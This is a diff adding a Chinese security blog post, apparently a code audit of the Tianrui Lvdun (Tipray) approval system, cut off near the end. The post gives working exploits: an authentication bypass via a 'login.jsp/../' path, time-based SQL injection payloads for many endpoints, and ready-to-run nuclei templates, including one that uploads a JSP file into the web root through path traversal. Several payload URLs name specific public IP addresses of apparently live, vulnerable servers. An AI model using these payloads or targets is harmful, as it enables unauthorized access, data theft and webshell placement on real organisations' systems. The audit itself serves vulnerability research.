@@ -1,0 +1,802 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="This_is_Y">
+    
+    <title>
+        
+            天锐绿盾审批系统代码审计 |
+        
+        This_is_Y
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/images/title.jpg">
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.3/font/css/fontawesome.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.3/font/css/regular.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.3/font/css/solid.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.3/font/css/brands.min.css">
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"this-is-y.github.io","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#33CCCC","title":"This_is_Y","author":"This_is_Y","avatar":"/images/head.png","logo":"/images/title1.jpg","favicon":"/images/title.jpg","url":"https://github.com/This-is-Y/"},"menu":{"home":"/","archives":"/archives","Archives":"/archives","cnblogs":"/categories/cnblogs","Game":"/Game","shell":"/Reverseshell"},"first_screen":{"enable":false,"background_img":"/images/Watch.png","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":false},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":false,"percent":false,"hide_header":true},"home":{"announcement":null,"category":false,"tag":false,"post_datetime":"updated"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":false,"img_link":null,"text":null,"icon":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":false,"init_open":false,"layout":"left"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":true,"use":"valine","valine":{"appid":"pnLUL03RCIjbXBNX6m4sBrtq-gzGzoHsz","appkey":"itjAi31G55tfhpSKJiuLDe2g","meta":["nick","mail","link"],"placeholder":"生命是上天的馈赠，我不想虚度年华"},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.36"},"waline":{"server_url":null,"reaction":false,"version":"3.2.1"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":true,"provider":"cdnjs"},"pjax":{"enable":true},"footer":{"since":2021,"word_count":false,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.1.3"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/title1.jpg">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               This_is_Y
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                
+                                首页
+                            </a>
+                        </li>
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                
+                                归档
+                            </a>
+                        </li>
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories/cnblogs"
+                            >
+                                
+                                CNBLOGS
+                            </a>
+                        </li>
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/game"
+                            >
+                                
+                                GAME
+                            </a>
+                        </li>
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/reverseshell"
+                            >
+                                
+                                SHELL
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/"
+                    >首页</a>
+                </li>
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives"
+                    >归档</a>
+                </li>
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories/cnblogs"
+                    >CNBLOGS</a>
+                </li>
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/game"
+                    >GAME</a>
+                </li>
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/reverseshell"
+                    >SHELL</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        天锐绿盾审批系统代码审计
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/head.png">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">This_is_Y</span>
+                                
+                                    <span class="author-badge">Lv6</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2025-09-02 11:21:37</span>
+            </span>
+
+            <span class="meta-info-item post-update-date">
+                <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                <span class="datetime" data-updated="Sun Oct 12 2025 14:37:32 GMT+0800">2025-10-12 14:37:32</span>
+            </span>
+        
+
+        
+
+        
+
+        
+        
+            <span class="meta-info-item post-wordcount">
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>4.6k 字</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-min2read">
+                <i class="icon fas fa-clock"></i>&nbsp;<span>25 分钟</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    <h1 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h1><p>由于过滤器中的isNoNeedValidate函数存在问题，所以可导致所有后台接口未授权访问。</p>
+<h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><p>系统是mvc加工，用的mybatis，mapper文件在./WEB-INF/classes/db/mapping/中，先看${}的情况，一共17个，</p>
+<p><img src="image-20250902140612740.png" alt="image-20250902140612740"></p>
+<h2 id="findTenantPage-do注入"><a href="#findTenantPage-do注入" class="headerlink" title="findTenantPage.do注入"></a>findTenantPage.do注入</h2><p>在经过一番审计后，发现一处可利用的sql注入</p>
+<p>WEB-INF/classes/com/trwfe/controller/InvokerController.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&#123;&quot;/findTenantPage.do&quot;&#125;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> GridPage&lt;Tenant&gt; <span class="title">findTenantPage</span><span class="params">(PageVo pageVo)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">long</span> count = <span class="keyword">this</span>.invokerService.findAllTenantCount();</span><br><span class="line">      List&lt;Tenant&gt; list = <span class="keyword">this</span>.invokerService.findAllTenantPage(pageVo);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> GridPage(count, list);</span><br><span class="line">   &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">      log.error(<span class="string">&quot;查询调用产品列表&quot;</span>, e);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>WEB-INF/classes/com/trwfe/service/InvokerService.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Tenant&gt; <span class="title">findAllTenantPage</span><span class="params">(PageVo pageVo)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">this</span>.invokerMapper.findAllTenantPage(pageVo);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>WEB-INF/classes/com/trwfe/bean/vo/PageVo.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PageVo</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">int</span> page = <span class="number">1</span>;</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">int</span> rows = <span class="number">10</span>;</span><br><span class="line">   <span class="keyword">private</span> String sort;</span><br><span class="line">   <span class="keyword">private</span> String order;</span><br><span class="line">   <span class="keyword">private</span> String pageSql = <span class="string">&quot;&quot;</span>;</span><br><span class="line">…………</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>WEB-INF/classes/db/mapping/Invoker.xml</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 所有的调用产品方page --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;findAllTenantPage&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;com.trwfe.bean.vo.PageVo&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.trwfe.bean.Tenant&quot;</span>&gt;</span></span><br><span class="line">    select * from ext_tenant_info $&#123;pageSql&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>最后的payload为：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/trwfe/login.jsp/../invoker/findTenantPage.do?page=1&amp;rows=5&amp;sort=id,(SELECT/**/*/**/FROM/**/(SELECT/**/SLEEP(2.6))a)&amp;order=asc</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>xxxx</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20250902234148036.png" alt="image-20250902234148036"></p>
+<p><img src="image-20250902234204048.png" alt="image-20250902234204048"></p>
+<h3 id="nuclei模板"><a href="#nuclei模板" class="headerlink" title="nuclei模板"></a>nuclei模板</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">id:</span> <span class="string">TianRui-LvDun-findTenantPage-SQLi</span></span><br><span class="line"><span class="attr">info:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">天锐绿盾审批系统-findTenantPage.do-存在SQL注入漏洞</span></span><br><span class="line">  <span class="attr">author:</span> <span class="string">This_is_Y</span></span><br><span class="line">  <span class="attr">severity:</span> <span class="string">high</span></span><br><span class="line">  <span class="attr">description:</span> <span class="string">天锐绿盾审批系统-findTenantPage.do的findAllTenantPage函数未处理pageVo参数,直接拼接到</span> <span class="string">select</span> <span class="string">*</span> <span class="string">from</span> <span class="string">ext_tenant_info</span> <span class="string">$&#123;pageSql&#125;中</span></span><br><span class="line">  <span class="attr">tags:</span> <span class="string">sqli,time-based,negative-match</span></span><br><span class="line">  <span class="attr">metadata:</span></span><br><span class="line">    <span class="attr">fofa-query:</span> <span class="string">app=&quot;TIPPAY-绿盾审批系统&quot;</span></span><br><span class="line"><span class="attr">requests:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">raw:</span></span><br><span class="line">      <span class="comment"># 正常请求（用于对比）</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">|</span></span><br><span class="line">        <span class="string">GET</span> <span class="string">/trwfe/login.jsp/../invoker/findTenantPage.do</span> <span class="string">HTTP/1.1</span></span><br><span class="line">        <span class="attr">User-Agent:</span> <span class="string">Mozilla/5.0</span> <span class="string">(Macintosh;</span> <span class="string">Intel</span> <span class="string">Mac</span> <span class="string">OS</span> <span class="string">X</span> <span class="string">10_15_7)</span> <span class="string">AppleWebKit/537.36</span> <span class="string">(KHTML,</span> <span class="string">like</span> <span class="string">Gecko)</span> <span class="string">Chrome/125.0.0.0</span> <span class="string">Safari/537.36</span></span><br><span class="line">        <span class="attr">Host:</span> &#123;&#123;<span class="string">Hostname</span>&#125;&#125;</span><br><span class="line">        </span><br><span class="line">      <span class="comment"># 注入请求</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">|</span></span><br><span class="line">        <span class="string">GET</span> <span class="string">/trwfe/login.jsp/../invoker/findTenantPage.do?page=1&amp;rows=5&amp;sort=id,(SELECT/**/*/**/FROM/**/(SELECT/**/SLEEP(2.6))a)&amp;order=asc</span> <span class="string">HTTP/1.1</span></span><br><span class="line">        <span class="attr">User-Agent:</span> <span class="string">Mozilla/5.0</span> <span class="string">(Macintosh;</span> <span class="string">Intel</span> <span class="string">Mac</span> <span class="string">OS</span> <span class="string">X</span> <span class="string">10_15_7)</span> <span class="string">AppleWebKit/537.36</span> <span class="string">(KHTML,</span> <span class="string">like</span> <span class="string">Gecko)</span> <span class="string">Chrome/125.0.0.0</span> <span class="string">Safari/537.36</span></span><br><span class="line">        <span class="attr">Host:</span> &#123;&#123;<span class="string">Hostname</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="attr">req-condition:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">matchers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">dsl</span></span><br><span class="line">        <span class="attr">dsl:</span></span><br><span class="line">          <span class="comment"># 第二个请求的时间应该比第一个请求的时间长至少4秒</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">&quot;duration_2 - duration_1 &gt;= 2.6&quot;</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">&quot;status_code_2 == status_code_1&quot;</span></span><br><span class="line">        <span class="attr">condition:</span> <span class="string">and</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">extractors:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">dsl</span></span><br><span class="line">        <span class="attr">dsl:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">&quot;duration_2 - duration_1&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20250902234259757.png" alt="image-20250902234259757"></p>
+<p>跑了一下，有101个还存在问题（本来以为是0day，结果发现已经有人交过了</p>
+<p><img src="image-20250910144012669.png" alt="image-20250910144012669"></p>
+<h2 id="findAllCategory-do注入"><a href="#findAllCategory-do注入" class="headerlink" title="findAllCategory.do注入"></a>findAllCategory.do注入</h2><p><img src="image-20250910150140270.png" alt="image-20250910150140270"></p>
+<p><img src="image-20250910150156723.png" alt="image-20250910150156723"></p>
+<p>除此之外还有</p>
+<p>findDeptPage.do：<code>http://61.155.117.195:8280/trwfe/login.jsp/../dept/findDeptPage.do?page=1&amp;rows=5&amp;sort=1,(SELECT/**/*/**/FROM/**/(SELECT/**/SLEEP(2.6))a)&amp;order=asc</code></p>
+<p>findFileServerPage.do:<code>http://61.155.117.195:8280/trwfe/login.jsp/../fileServer/findFileServerPage.do?page=1&amp;rows=5&amp;sort=1,(SELECT/**/*/**/FROM/**/(SELECT/**/SLEEP(2.6))a)&amp;order=asc</code></p>
+<p>findRolePage.do: <code>http://61.155.117.195:8280/trwfe/login.jsp/../role/findRolePage.do?page=1&amp;rows=5&amp;sort=1,(SELECT/**/*/**/FROM/**/(SELECT/**/SLEEP(2.6))a)&amp;order=asc</code></p>
+<p>findPropertyPage.do:<code>http://222.92.30.62:8280/trwfe/login.jsp/../invoker/findPropertyPage.do?tenantId=1&amp;categoryId=1&amp;page=1&amp;rows=5&amp;sort=id,(SELECT/**/*/**/FROM/**/(SELECT/**/SLEEP(2.6))a)&amp;order=asc</code></p>
+<p>findModulePage.do:<code>http://222.92.30.62:8280/trwfe/login.jsp/../menu/findModulePage.do?page=1&amp;rows=5&amp;sort=id,(SELECT/**/*/**/FROM/**/(SELECT/**/SLEEP(2.6))a)&amp;order=asc</code></p>
+<p>findSingConfigPage.do.do:<code>http://183.250.5.43:8280/trwfe/login.jsp/../thirdSystemConfig/findSingConfigPage.do?page=1&amp;rows=5&amp;sort=1,(SELECT/**/*/**/FROM/**/(SELECT/**/SLEEP(2.6))a)&amp;order=asc</code></p>
+<p>findUserPage.do:<code>http://183.250.5.43:8280/trwfe/login.jsp/../user/findUserPage.do?deptId=&amp;userName=&amp;userStatus=&amp;sort=id,(SELECT/**/*/**/FROM/**/(SELECT/**/SLEEP(2.6))a)&amp;order=asc</code></p>
+<p>findUserPageExcludeCurrentUser.do(需要登录):<code>http://183.250.5.43:8280/trwfe/user/findUserPageExcludeCurrentUser.do?page=1&amp;rows=5&amp;sort=1,(SELECT/**/*/**/FROM/**/(SELECT/**/SLEEP(2.6))a)&amp;order=asc&amp;deptId=1</code></p>
+<h1 id="token"><a href="#token" class="headerlink" title="token"></a>token</h1><p>系统的token为16进制格式</p>
+<p><img src="image-20250915111450178.png" alt="image-20250915111450178"></p>
+<p>这里我手上两份代码关于token的代码不一样，所以我也不知道哪个是原代码（或者都不是），</p>
+<p>第一份的token直接就是把用户id和密码拼接一下然后base64编码一下就返回给客户端了。肯定是不行的，</p>
+<p><img src="image-20250915111602332.png" alt="image-20250915111602332"></p>
+<p>第二份的token正规一点，使用的jwt。进入getWebThirdTokenFromServer函数</p>
+<p>WEB-INF/classes/com/trwfe/controller/UserController.java</p>
+<p><img src="image-20250915111815335.png" alt="image-20250915111815335"></p>
+<p>WEB-INF/classes/com/trwfe/util/JWTUtils.java</p>
+<p><img src="image-20250915111937826.png" alt="image-20250915111937826"></p>
+<p><img src="image-20250915112003091.png" alt="image-20250915112003091"></p>
+<p><img src="image-20250915112032668.png" alt="image-20250915112032668"></p>
+<p>在getToken中可以看到，签名用的SECRET也不是弱密钥，而且在获取到jwt token后，还用RC4加密了一层，RCE4的密钥也不算弱密钥。</p>
+<h1 id="上传"><a href="#上传" class="headerlink" title="上传"></a>上传</h1><p>除了之前的那个uploadwxfile接口外，还有一个addUpFile.do接口</p>
+<p><img src="image-20250915155405367.png" alt="image-20250915155405367"></p>
+<p><img src="image-20250915154753007.png" alt="image-20250915154753007"></p>
+<p>可以看到需要三个参数，而且relativepath不能为空，不然文件名就会变成randomUUID</p>
+<p>sb是最终的文件保存路径，可以看到前面先添加了disc和taskid，其中disc是代表临时目录，在tomcat中也就是/tomcat/temp/</p>
+<p>随后是对relativepath参数进行拆解再拼接，由于for循环的终止条件是<code>i &lt; split.length - 1</code>，所以它会抛弃relativepath的最后一个/后面的东西，举个例子就是如果我想要上传到ROOT目录下，relativepath的值为就要以/ROOT/tmp结尾，当然最终拼接的路径还和taskid有关，</p>
+<p>最终的file路径为：E:/TRWfe/tomcat/temp/+taskid+relativepath(去掉尾部)+filename</p>
+<p>E:/TRWfe/tomcat/temp/../../test03.jsp =&gt; E:/TRWfe/test03.jsp</p>
+<p><img src="image-20250915173615794.png" alt="image-20250915173615794"></p>
+<p>E:/TRWfe/tomcat/temp/1/../../test03.jsp =&gt; E:/TRWfe/tomcat/test03.jsp</p>
+<p>需要注意的是，不穿taskid参数，taskid就是null，这和传空值taskid是不一样的</p>
+<p><img src="image-20250915173820272.png" alt="image-20250915173820272"></p>
+<p>所以要上传到ROOT目录下，就要如下构造</p>
+<p><img src="image-20250915174204759.png" alt="image-20250915174204759"></p>
+<p>Yaml如下</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">id:</span> <span class="string">TianRui-LvDun-addUpFile-upload</span></span><br><span class="line"><span class="attr">info:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">天锐绿盾审批系统-addUpFile.do-存在任意文件上传</span></span><br><span class="line">  <span class="attr">author:</span> <span class="string">This_is_Y</span></span><br><span class="line">  <span class="attr">severity:</span> <span class="string">critical</span></span><br><span class="line">  <span class="attr">description:</span> <span class="string">天锐绿盾审批系统-addUpFile.do的</span> <span class="string">addFile</span> <span class="string">函数未处理文件名以及文件路径参数,可以通过目录穿越上传任意文件到任意路径中</span></span><br><span class="line">  <span class="attr">tags:</span> <span class="string">upload</span></span><br><span class="line">  <span class="attr">metadata:</span></span><br><span class="line">    <span class="attr">fofa-query:</span> <span class="string">app=&quot;TIPPAY-绿盾审批系统&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">http:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">raw:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">|</span></span><br><span class="line">      <span class="string">POST</span> <span class="string">/trwfe/login.jsp/../file/addUpFile.do</span> <span class="string">HTTP/1.1</span></span><br><span class="line">      <span class="attr">User-Agent:</span> <span class="string">Mozilla/5.0</span> <span class="string">(MSIE</span> <span class="number">10.0</span><span class="string">;</span> <span class="string">Windows</span> <span class="string">NT</span> <span class="number">3.14</span><span class="string">;</span> <span class="string">Trident/5.0)</span></span><br><span class="line">      <span class="attr">Connection:</span> <span class="string">keep-alive</span></span><br><span class="line">      <span class="attr">Content-Length:</span> <span class="number">316</span></span><br><span class="line">      <span class="attr">Cookie:</span> <span class="string">lang=zh</span></span><br><span class="line">      <span class="attr">X-requested-with:</span> <span class="string">XMLHtTpRequest</span></span><br><span class="line">      <span class="attr">Content-Type:</span> <span class="string">multipart/form-data;</span> <span class="string">boundary=----WebKitFormBoundarynvgfpfpm</span></span><br><span class="line">      <span class="attr">Accept-Encoding:</span> <span class="string">gzip,</span> <span class="string">deflate,</span> <span class="string">br</span></span><br><span class="line"></span><br><span class="line">      <span class="string">------WebKitFormBoundarynvgfpfpm</span></span><br><span class="line">      <span class="attr">Content-Disposition:</span> <span class="string">form-data;</span> <span class="string">name=&quot;file&quot;;</span> <span class="string">filename=&quot;7ygv8uhb.jsp&quot;</span></span><br><span class="line">      <span class="attr">Content-Type:</span> <span class="string">application/octet-stream</span></span><br><span class="line"></span><br><span class="line">      &lt;%<span class="ruby">out.print(<span class="string">&quot;0okm&quot;</span>);</span>%&gt;</span><br><span class="line">      <span class="string">------WebKitFormBoundarynvgfpfpm</span></span><br><span class="line">      <span class="attr">Content-Disposition:</span> <span class="string">form-data;</span> <span class="string">name=&quot;relativepath&quot;</span></span><br><span class="line"></span><br><span class="line">      <span class="string">../../webapps/ROOT/del</span></span><br><span class="line">      <span class="string">------WebKitFormBoundarynvgfpfpm</span></span><br><span class="line">    <span class="attr">matchers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">status</span></span><br><span class="line">        <span class="attr">status:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="number">200</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">word</span></span><br><span class="line">        <span class="attr">part:</span> <span class="string">body</span></span><br><span class="line">        <span class="attr">words:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">&#x27;true&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">matchers-condition:</span> <span class="string">and</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">method:</span> <span class="string">GET</span></span><br><span class="line">    <span class="attr">path:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&#x27;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/7ygv8uhb.jsp&#x27;</span></span><br><span class="line">    <span class="attr">matchers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">status</span></span><br><span class="line">        <span class="attr">status:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="number">200</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">word</span></span><br><span class="line">        <span class="attr">part:</span> <span 